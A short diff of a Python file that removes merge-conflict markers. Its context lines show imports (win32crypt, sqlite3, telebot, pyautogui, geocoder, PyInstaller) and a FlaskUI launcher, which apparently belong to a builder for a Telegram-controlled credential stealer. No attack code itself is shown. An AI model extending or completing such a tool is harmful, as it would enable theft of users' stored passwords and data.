@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 import os,wget,PyInstaller,telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder
 from telebot import types
 from shutil import copyfile
@@ -94,4 +93,3 @@ def start(bot_token):
 
 if __name__ == '__main__':
     FlaskUI(app, width=360, height=590).run()
->>>>>>> c2f7f8f66e88b7fe69520e180b98f499f96143c4
